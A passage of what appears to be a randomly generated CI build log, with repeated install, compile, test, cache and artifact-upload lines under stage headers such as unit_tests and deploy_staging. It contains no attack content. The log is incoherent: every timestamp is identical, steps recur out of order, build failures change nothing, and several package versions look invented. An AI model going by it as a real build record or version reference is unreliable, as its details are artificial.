build.tar.gz (45MB)\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (320ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/index.js...\nCache hit for key-4174\n  PASS: test_db_connect (71ms)\nCompiling src/utils.go...\nInstalling webpack@4.14.0\nInstalling eslint@1.6.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nInstalling react@2.1.0\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@2.8.0\nCache hit for key-6801\nStep 5/10: Building\nStep 10/10: Building\nCache hit for key-5352\n[12:00:18] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (265ms)\nCompiling src/main.py...\nCache hit for key-9905\nInstalling axios@4.16.0\n  PASS: test_api_health (499ms)\nInstalling express@2.15.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@2.8.0\n\u2713 build completed\nInstalling eslint@4.10.0\nInstalling eslint@3.16.0\nStep 7/10: Building\nInstalling lodash@3.15.0\n\u2713 build completed\nStep 10/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_cache_hit (88ms)\n[12:00:18] INFO: Processing request\nCache hit for key-8750\nStep 10/10: Building\nCompiling src/app.ts...\n\u2717 build failed with exit code 91\n  PASS: test_cache_hit (252ms)\n[12:00:18] INFO: Processing request\nInstalling prettier@5.1.0\n  PASS: test_api_health (154ms)\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-5897\n=== Step install_dependencies completed ===\n=== Step: checkout ===\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 build completed\nCache hit for key-6097\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_db_connect (186ms)\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-2017\nStep 2/10: Building\nInstalling eslint@3.13.0\n\u2713 build completed\nInstalling react@5.15.0\n  PASS: test_db_connect (286ms)\n  PASS: test_db_connect (88ms)\nInstalling axios@3.18.0\n  PASS: test_user_create (20ms)\nCache hit for key-2061\nCache hit for key-9775\nInstalling express@2.11.0\nCache hit for key-6731\nInstalling react@3.17.0\nCache hit for key-7319\nCompiling src/index.js...\nInstalling webpack@4.11.0\nInstalling prettier@5.15.0\n[12:00:18] INFO: Processing request\nInstalling axios@3.12.0\nStep 8/10: Building\nCompiling src/handler.rs...\nInstalling express@5.2.0\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-4440\n[12:00:18] INFO: Processing request\nStep 6/10: Building\nCache hit for key-2584\nCache hit for key-9226\nInstalling react@4.4.0\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nStep 2/10: Building\nInstalling prettier@3.8.0\nInstalling axios@1.17.0\n  PASS: test_auth_login (442ms)\n\u2713 test completed\nCache hit for key-7518\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (421ms)\n[12:00:18] INFO: Processing request\nStep 10/10: Building\nStep 9/10: Building\nCompiling src/main.py...\nStep 5/10: Building\n[12:00:18] WARN: Deprecated API usage\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-6828\n\u2713 test completed\n  PASS: test_user_create (205ms)\n  PASS: test_user_create (5ms)\nCache hit for key-2000\nCache hit for key-8113\n  PASS: test_api_health (388ms)\n  PASS: test_user_create (248ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nStep 7/10: Building\n  PASS: test_user_create (258ms)\nCache hit for key-8170\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-4068\nCache hit for key-6913\n  PASS: test_cache_hit (54ms)\nInstalling react@4.10.0\nStep 6/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-2225\n\u2713 lint completed\n\u2713 test completed\nStep 2/10: Building\nStep 6/10: Building\n[12:00:18] WARN: Deprecated API usage\nInstalling react@2.2.0\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n\u2713 lint completed\nCompiling src/app.ts...\nCache hit for key-3769\n[12:00:18] INFO: Processing request\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n  PASS: test_api_health (363ms)\n\u2713 lint completed\nException: TypeError\n  PASS: test_api_health (151ms)\n  PASS: test_db_connect (359ms)\nStep 7/10: Building\n  PASS: test_auth_login (251ms)\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCache hit for key-4330\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nStep 10/10: Building\nCompiling src/handler.rs...\nFAILED: test_cache_hit\n\u2717 build failed with exit code 114\nCompiling src/handler.rs...\nCache hit for key-5663\nStep 4/10: Building\nStep 1/10: Building\nCache hit for key-1663\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/service.java...\nCache hit for key-4777\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nStep 4/10: Building\nCache hit for key-4531\n\u2713 test completed\n  PASS: test_api_health (47ms)\n[12:00:18] ERROR: Connection failed\n\u2717 build failed with exit code 98\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nInstalling react@4.0.0\nInstalling react@4.8.0\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nInstalling jest@2.7.0\nCache hit for key-7259\nInstalling axios@5.19.0\nStep 5/10: Building\nStep 7/10: Building\nInstalling axios@1.11.0\nCompiling src/service.java...\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (105ms)\nCache hit for key-9327\nCache hit for key-7134\nStep 9/10: Building\nCache hit for key-5431\nCompiling src/service.java...\n\u2713 build completed\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nCompiling src/app.ts...\nCompiling src/index.js...\nInstalling react@5.11.0\n[12:00:18] INFO: Processing request\nInstalling lodash@5.0.0\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\n=== Step checkout completed ===\n=== Step: unit_tests ===\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (496ms)\nCache hit for key-9513\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-5229\nCache hit for key-6182\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-6394\n  PASS: test_api_health (455ms)\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-1477\nCache hit for key-7250\nCache hit for key-8456\n\u2713 lint completed\nCompiling src/index.js...\n  PASS: test_user_create (199ms)\n\u2713 test completed\n\u2713 test completed\n  PASS: test_user_create (30ms)\n\u2713 lint completed\nCompiling src/app.ts...\nCache hit for key-9103\nCompiling src/main.py...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-7308\n  PASS: test_user_create (197ms)\n  PASS: test_cache_hit (346ms)\nArtifact uploaded: build.tar.gz (32MB)\nStep 7/10: Building\n  PASS: test_api_health (125ms)\n\u2713 lint completed\n\u2713 build completed\nInstalling axios@5.9.0\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:18] INFO: Processing request\nStep 9/10: Building\nCache hit for key-3881\n\u2713 lint completed\nStep 4/10: Building\nCache hit for key-9957\nInstalling express@3.10.0\nInstalling webpack@3.15.0\nCache hit for key-4781\n\u2713 lint completed\nCache hit for key-8484\n\u2717 build failed with exit code 17\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-2587\nFAILED: test_auth_login\nCache hit for key-3871\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling eslint@2.16.0\nArtifact uploaded: build.tar.gz (17MB)\nInstalling lodash@1.6.0\n[12:00:18] INFO: Processing request\nWARNING: react has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/index.js...\nInstalling express@3.15.0\nCache hit for key-8987\n[12:00:18] INFO: Processing request\nInstalling webpack@2.11.0\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n\u2713 lint completed\n\u2717 build failed with exit code 60\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-6452\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (1ms)\nStep 3/10: Building\n\u2713 lint completed\n\u2713 lint completed\n\u2713 build completed\nException: NullPointerException\nInstalling prettier@2.14.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_api_health (335ms)\nStep 1/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (34MB)\nStep 7/10: Building\n  PASS: test_auth_login (160ms)\nStep 2/10: Building\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (14MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/app.ts...\n\u2713 build completed\nCache hit for key-9952\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/handler.rs...\nCache hit for key-2219\nCompiling src/utils.go...\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\n\u2713 build completed\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:18] ERROR: Connection failed\nInstalling prettier@4.17.0\n\u2713 build completed\nCache hit for key-1298\n  PASS: test_user_create (325ms)\nInstalling prettier@3.5.0\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-8339\n\u2713 lint completed\n  PASS: test_auth_login (91ms)\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nCache hit for key-1859\n  PASS: test_cache_hit (47ms)\nCompiling src/app.ts...\nInstalling lodash@3.6.0\nWARNING: axios has known vulnerabilities\nCompiling src/app.ts...\n  PASS: test_user_create (313ms)\nStep 10/10: Building\nInstalling lodash@4.3.0\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_cache_hit (258ms)\n\u2713 build completed\nCompiling src/app.ts...\n\u2713 lint completed\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nInstalling react@4.1.0\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-8061\nCompiling src/handler.rs...\nCompiling src/utils.go...\nStep 6/10: Building\nStep 10/10: Building\nCache hit for key-9395\nCache hit for key-8951\n  PASS: test_auth_login (157ms)\n  PASS: test_api_health (234ms)\nCache hit for key-4755\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-2724\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-3982\nStep 9/10: Building\n=== Step unit_tests completed ===\n=== Step: setup_node ===\n\u2713 build completed\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (15MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_auth_login\n\u2717 build failed with exit code 60\nInstalling axios@5.9.0\n\u2713 build completed\nCache hit for key-4794\n\u2713 test completed\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCompiling src/service.java...\nInstalling lodash@5.8.0\nCompiling src/app.ts...\nCache hit for key-1127\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n\u2713 test completed\n\u2713 build completed\nStep 10/10: Building\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCache hit for key-7495\nCompiling src/utils.go...\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-8012\nInstalling react@3.5.0\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-8865\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/main.py...\nCache hit for key-7047\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (314ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:18] INFO: Processing request\n\u2713 test completed\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (383ms)\nCache hit for key-7342\nWARNING: lodash has known vulnerabilities\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n\u2713 test completed\nCompiling src/main.py...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/main.py...\nCompiling src/service.java...\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 test completed\n  PASS: test_api_health (192ms)\n  PASS: test_db_connect (473ms)\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 test completed\n\u2713 lint completed\nStep 10/10: Building\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/app.ts...\n  PASS: test_user_create (188ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCache hit for key-2261\nInstalling prettier@1.13.0\nCache hit for key-5453\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/handler.rs...\n\u2713 lint completed\nCompiling src/app.ts...\nFAILED: test_db_connect\nInstalling lodash@1.20.0\n\u2713 build completed\n\u2713 build completed\n  PASS: test_auth_login (384ms)\nCache hit for key-6631\nInstalling axios@3.14.0\nCompiling src/app.ts...\nStep 2/10: Building\nStep 5/10: Building\nInstalling eslint@5.6.0\n[12:00:18] INFO: Processing request\nStep 2/10: Building\nInstalling express@5.13.0\n\u2713 build completed\nCache hit for key-5787\nArtifact uploaded: build.tar.gz (19MB)\nStep 3/10: Building\n[12:00:18] INFO: Processing request\nInstalling webpack@5.16.0\nException: TypeError\n  PASS: test_api_health (183ms)\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-1277\n  PASS: test_db_connect (25ms)\nCache hit for key-3062\nStep 6/10: Building\nCompiling src/handler.rs...\n  PASS: test_user_create (266ms)\nCompiling src/main.py...\nCache hit for key-8660\nCompiling src/service.java...\nInstalling webpack@3.16.0\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-2753\n  PASS: test_cache_hit (284ms)\nWARNING: axios has known vulnerabilities\nInstalling jest@1.15.0\nArtifact uploaded: build.tar.gz (13MB)\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-4246\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\nStep 6/10: Building\n  PASS: test_db_connect (399ms)\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_user_create (216ms)\nCache hit for key-2504\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nInstalling axios@2.11.0\nInstalling eslint@1.19.0\n\u2713 test completed\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (403ms)\n\u2713 lint completed\nCompiling src/utils.go...\nStep 1/10: Building\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: axios has known vulnerabilities\n[12:00:18] ERROR: Connection failed\n  PASS: test_auth_login (395ms)\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-9295\n  PASS: test_auth_login (469ms)\nCompiling src/index.js...\nInstalling react@2.2.0\n  PASS: test_api_health (147ms)\n  PASS: test_db_connect (1ms)\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-9675\n\u2713 test completed\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n=== Step setup_node completed ===\n=== Step: build ===\nCache hit for key-7049\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-2699\n  PASS: test_cache_hit (221ms)\nCache hit for key-9649\nStep 3/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-3659\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 31\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling jest@3.11.0\n  PASS: test_auth_login (400ms)\nInstalling axios@5.20.0\nStep 9/10: Building\n  PASS: test_auth_login (212ms)\nInstalling prettier@1.10.0\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCompiling src/service.java...\n  PASS: test_auth_login (401ms)\n\u2713 test completed\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n[12:00:18] WARN: Deprecated API usage\nCompiling src/index.js...\n  PASS: test_auth_login (71ms)\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-8546\nStep 8/10: Building\nCache hit for key-3509\nCache hit for key-2016\nCompiling src/utils.go...\nStep 8/10: Building\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\nInstalling eslint@1.18.0\nInstalling lodash@1.0.0\nStep 9/10: Building\nInstalling eslint@3.3.0\nInstalling react@4.19.0\n  PASS: test_auth_login (155ms)\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5920\nStep 6/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/app.ts...\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nInstalling react@5.17.0\nArtifact uploaded: build.tar.gz (13MB)\nStep 2/10: Building\nInstalling jest@3.7.0\n\u2713 lint completed\n\u2713 build completed\nInstalling webpack@1.4.0\nCompiling src/utils.go...\nCache hit for key-9634\n  PASS: test_auth_login (152ms)\nStep 8/10: Building\nCache hit for key-6773\nStep 3/10: Building\n  PASS: test_api_health (379ms)\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 9/10: Building\nWARNING: react has known vulnerabilities\n[12:00:18] ERROR: Connection failed\n  PASS: test_auth_login (227ms)\nInstalling eslint@2.15.0\n[12:00:18] INFO: Processing request\nFAILED: test_user_create\nStep 2/10: Building\nCache hit for key-9615\nStep 4/10: Building\nInstalling jest@1.16.0\n\u2713 test completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/app.ts...\n\u2713 test completed\nStep 4/10: Building\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-6718\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/utils.go...\nCompiling src/main.py...\nCompiling src/app.ts...\nWARNING: eslint has known vulnerabilities\nCache hit for key-4758\nArtifact uploaded: build.tar.gz (38MB)\nInstalling jest@3.5.0\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\n\u2717 build failed with exit code 92\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 build completed\nInstalling jest@5.8.0\nArtifact uploaded: build.tar.gz (21MB)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:18] INFO: Processing request\nInstalling webpack@1.5.0\nInstalling express@1.5.0\nCompiling src/handler.rs...\n\u2713 build completed\nStep 6/10: Building\n\u2713 test completed\n\u2713 lint completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (9MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-4365\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-7099\nCompiling src/utils.go...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-4246\n  PASS: test_auth_login (202ms)\nCompiling src/index.js...\n  PASS: test_cache_hit (337ms)\n  PASS: test_auth_login (487ms)\n[12:00:18] WARN: Deprecated API usage\nStep 2/10: Building\nWARNING: lodash has known vulnerabilities\nStep 1/10: Building\n\u2713 lint completed\nInstalling eslint@5.5.0\nCache hit for key-5133\nCache hit for key-7547\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\n[12:00:18] ERROR: Connection failed\n  PASS: test_api_health (205ms)\nCache hit for key-7878\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (18MB)\nStep 2/10: Building\n\u2713 test completed\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-6515\n\u2713 test completed\nWARNING: react has known vulnerabilities\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCompiling src/main.py...\nCache hit for key-6962\n  PASS: test_cache_hit (118ms)\nInstalling express@5.9.0\n\u2713 lint completed\nStep 5/10: Building\n=== Step build completed ===\n=== Step: setup_environment ===\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-3080\nArtifact uploaded: build.tar.gz (10MB)\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nInstalling jest@1.9.0\n  PASS: test_api_health (326ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] WARN: Deprecated API usage\nStep 2/10: Building\nCache hit for key-3182\n  PASS: test_db_connect (36ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_db_connect (312ms)\n\u2713 build completed\nCache hit for key-5118\n[12:00:18] WARN: Deprecated API usage\nCompiling src/service.java...\nCache hit for key-1772\nCompiling src/index.js...\n  PASS: test_auth_login (379ms)\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-4791\n[12:00:18] INFO: Processing request\nInstalling jest@4.0.0\n[12:00:18] INFO: Processing request\nCache hit for key-1324\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\nCompiling src/main.py...\n  PASS: test_db_connect (319ms)\nStep 5/10: Building\nInstalling express@2.10.0\n\u2713 lint completed\nCompiling src/utils.go...\nStep 9/10: Building\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (121ms)\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:18] INFO: Processing request\nInstalling react@5.19.0\nStep 3/10: Building\n  PASS: test_auth_login (379ms)\nCompiling src/service.java...\n[12:00:18] ERROR: Connection failed\nCompiling src/app.ts...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_cache_hit (52ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (19MB)\nStep 5/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (325ms)\n  PASS: test_auth_login (369ms)\nInstalling webpack@1.18.0\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (30MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nInstalling prettier@4.14.0\nStep 10/10: Building\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_db_connect (409ms)\n\u2717 build failed with exit code 12\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (247ms)\nStep 10/10: Building\n\u2713 test completed\n  PASS: test_cache_hit (291ms)\nCache hit for key-5498\nStep 1/10: Building\n\u2713 test completed\nInstalling axios@2.14.0\nInstalling lodash@4.9.0\nInstalling react@3.10.0\n[12:00:18] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (41MB)\nInstalling react@4.2.0\n\u2713 build completed\n  PASS: test_user_create (322ms)\nInstalling lodash@1.17.0\nInstalling jest@1.13.0\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:18] WARN: Deprecated API usage\nStep 5/10: Building\nCompiling src/index.js...\nInstalling eslint@3.18.0\n[12:00:18] INFO: Processing request\nCache hit for key-5744\n[12:00:18] INFO: Processing request\nInstalling eslint@3.2.0\nCompiling src/service.java...\nStep 2/10: Building\n  PASS: test_user_create (315ms)\nStep 9/10: Building\nCache hit for key-1896\nInstalling react@2.7.0\nCompiling src/handler.rs...\nInstalling eslint@2.13.0\n  PASS: test_auth_login (220ms)\nCache hit for key-9618\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-9460\n\u2713 build completed\nInstalling eslint@4.1.0\nCompiling src/app.ts...\n[12:00:18] ERROR: Connection failed\nFAILED: test_api_health\nInstalling axios@3.14.0\nInstalling prettier@1.18.0\n\u2713 test completed\n[12:00:18] INFO: Processing request\nInstalling lodash@1.13.0\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 lint completed\nStep 5/10: Building\nInstalling jest@5.7.0\nInstalling webpack@4.6.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] INFO: Processing request\n\u2713 test completed\nStep 7/10: Building\nWARNING: prettier has known vulnerabilities\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/service.java...\n\u2717 build failed with exit code 88\n[12:00:18] INFO: Processing request\nCache hit for key-1616\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/10: Building\n  PASS: test_user_create (201ms)\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (286ms)\n\u2713 build completed\nCompiling src/handler.rs...\nCache hit for key-9744\nArtifact uploaded: build.tar.gz (27MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-3015\nCompiling src/main.py...\n  PASS: test_db_connect (58ms)\n  PASS: test_auth_login (406ms)\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\n\u2713 test completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\n  PASS: test_auth_login (86ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nWARNING: lodash has known vulnerabilities\nCache hit for key-7617\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 lint completed\nInstalling prettier@1.10.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:18] ERROR: Connection failed\nCache hit for key-8492\n\u2713 build completed\nStep 10/10: Building\n  PASS: test_auth_login (78ms)\nInstalling lodash@5.4.0\nArtifact uploaded: build.tar.gz (16MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nInstalling eslint@3.11.0\nCompiling src/service.java...\nCache hit for key-4884\nArtifact uploaded: build.tar.gz (5MB)\nInstalling react@4.20.0\n[12:00:18] WARN: Deprecated API usage\nCompiling src/handler.rs...\n  PASS: test_api_health (456ms)\n  PASS: test_auth_login (205ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (250ms)\nArtifact uploaded: build.tar.gz (5MB)\nStep 9/10: Building\nStep 9/10: Building\nInstalling axios@5.6.0\nCompiling src/main.py...\nStep 1/10: Building\n  PASS: test_cache_hit (454ms)\nCache hit for key-9711\n  PASS: test_db_connect (301ms)\nCache hit for key-4282\nCompiling src/utils.go...\nCompiling src/utils.go...\nCache hit for key-5631\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nInstalling jest@5.7.0\nStep 3/10: Building\nCompiling src/utils.go...\nInstalling lodash@4.13.0\nWARNING: jest has known vulnerabilities\nStep 8/10: Building\nStep 1/10: Building\n\u2713 build completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_cache_hit (321ms)\nArtifact uploaded: build.tar.gz (45MB)\nStep 8/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (11MB)\nStep 3/10: Building\n[12:00:18] WARN: Deprecated API usage\nStep 9/10: Building\nCache hit for key-9843\n\u2713 build completed\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n\u2713 build completed\nStep 1/10: Building\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/index.js...\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nCompiling src/app.ts...\nStep 7/10: Building\nCache hit for key-5242\nStep 3/10: Building\nInstalling lodash@1.10.0\nCompiling src/app.ts...\nInstalling axios@5.9.0\nCache hit for key-1148\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nInstalling react@2.0.0\n\u2713 lint 